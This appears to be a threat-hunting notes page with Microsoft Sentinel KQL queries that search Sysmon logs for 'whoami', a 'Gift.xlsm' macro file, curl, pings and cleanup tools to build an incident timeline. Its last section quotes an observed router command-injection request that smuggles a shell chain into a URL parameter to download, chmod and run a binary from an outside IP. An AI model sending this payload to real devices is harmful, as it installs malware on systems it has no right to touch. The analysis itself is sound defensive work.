# Queries and Command Artifacts

## Sentinel Query

```kql
Sysmon
| where CommandLine contains "whoami"
```

This query finds `whoami` in Sysmon process telemetry. The command becomes meaningful when correlated with parent process, user, timing, and surrounding activity.

## Sentinel Process Field Review

```kql
Sysmon
| where CommandLine contains "whoami"
| project
    TimeGenerated,
    EventID,
    Computer,
    User,
    Image,
    CommandLine,
    ProcessId,
    ParentImage,
    ParentCommandLine,
    ParentProcessId
| order by TimeGenerated asc
```

This version keeps the key process-analysis fields: image, command line, parent process, process IDs, user, endpoint, and timestamp.

## Sentinel Timeline Expansion

```kql
Sysmon
| where User contains "Jim"
   or CommandLine has_any ("Gift.xlsm", "whoami", "curl", "ping", "cleanmgr", "CCleaner", "OneDriveSetup.exe", "cmd.xex")
   or ParentCommandLine has "Gift.xlsm"
| project
    TimeGenerated,
    EventID,
    Computer,
    User,
    Image,
    CommandLine,
    ParentImage,
    ParentCommandLine,
    ProcessId,
    ParentProcessId
| order by TimeGenerated asc
```

This expanded query connects `whoami` to the wider endpoint timeline: `Gift.xlsm`, `curl`, domain-controller pings, cleanup utilities, and related command-line activity.

## FortiGate Request Command Chain

```text
/cgi-bin/luci/;stok\=/locale?form\=country&operation\=write&country\=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.14.226.142/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`)
```

The request runs `id`, changes into `/tmp`, downloads `shk`, makes it executable, runs it with `tplink`, and removes it.
